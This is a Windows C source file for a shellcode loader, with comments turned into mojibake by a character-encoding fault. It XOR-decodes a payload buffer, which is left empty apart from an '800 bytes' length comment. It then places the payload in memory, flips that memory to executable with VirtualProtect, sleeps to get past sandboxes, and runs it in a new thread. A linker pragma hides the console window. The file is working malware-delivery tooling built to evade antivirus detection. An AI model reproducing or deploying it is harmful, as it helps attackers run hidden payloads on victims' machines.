#include <Windows.h>
#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")
// ��ں���
int main(int argc, TCHAR* argv[]) {

    int shellcode_size = 0; // shellcode����
    DWORD dwThreadId; // �߳�ID
    HANDLE hThread; // �߳̾��
    DWORD dwOldProtect; // �ڴ�ҳ����
/* length: 800 bytes */

    unsigned char buf[] = "";


    // ��ȡshellcode��С
    shellcode_size = sizeof(buf);

    /* ���������� */
    for (int i = 0; i < shellcode_size; i++) {
        buf[i] ^= 10;
    }
    /*
    VirtualAlloc(
        NULL, // ��ַ
        800,  // ��С
        MEM_COMMIT, // �ڴ�ҳ״̬
        PAGE_EXECUTE_READWRITE // �ɶ���д��ִ��
        );
    */

    char* shellcode = (char*)VirtualAlloc(
        NULL,
        shellcode_size,
        MEM_COMMIT,
        PAGE_READWRITE // ֻ����ɶ���д
        //ԭ����������PAGE_EXECUTE_READWRITE
    );

    // ��shellcode���Ƶ��ɶ���д���ڴ�ҳ��
    CopyMemory(shellcode, buf, shellcode_size);

    // ���￪ʼ������������Ϊ��ִ��
    VirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, &dwOldProtect);

    // �ȴ����룬�����������ĳЩɳ���أ�
    Sleep(2000);

    hThread = CreateThread(
        NULL, // ��ȫ������
        NULL, // ջ�Ĵ�С
        (LPTHREAD_START_ROUTINE)shellcode, // ����
        NULL, // ����
        NULL, // �̱߳�־
        &dwThreadId // �߳�ID
    );

    WaitForSingleObject(hThread, INFINITE); // һֱ�ȴ��߳�ִ�н���
    return 0;
}